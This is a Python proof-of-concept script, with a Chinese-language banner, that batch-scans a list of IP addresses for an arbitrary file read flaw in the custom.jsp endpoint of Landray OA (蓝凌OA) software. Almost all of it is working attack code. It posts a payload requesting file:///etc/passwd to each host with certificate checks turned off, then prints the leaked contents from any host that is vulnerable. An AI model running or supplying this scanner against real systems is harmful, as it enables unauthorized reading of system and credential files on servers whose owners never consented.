import requests
import urllib3
urllib3.disable_warnings()

def poc():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m蓝凌OA custom.jsp 任意文件读取漏洞批量扫描\033[0m        +')
    print('+ \033[1;36m公众号：bgbing安全\033[0m                                +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36mfile name>>>ip.txt           \033[0m                     +')
    print('+---------------------------------------------------+')
poc()
file=input("\033[1;36mfile name >>>\033[0m")
f=open(file,'r+')
for i in f.readlines():
    first=i.strip()
    url=first+"/sys/ui/extend/varkind/custom.jsp"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
            }
    data='var={"body":{"file":"file:///etc/passwd"}}'
    response=requests.post(url,data=data,headers=header,verify=False)
    if 'root' in response.text:
        print("\033[1;36m"+first+"\033[0m")
        print("\033[1;36m"+response.text+"\033[0m")
    else:
        print("\033[1;31m不存在漏洞\033[0m")
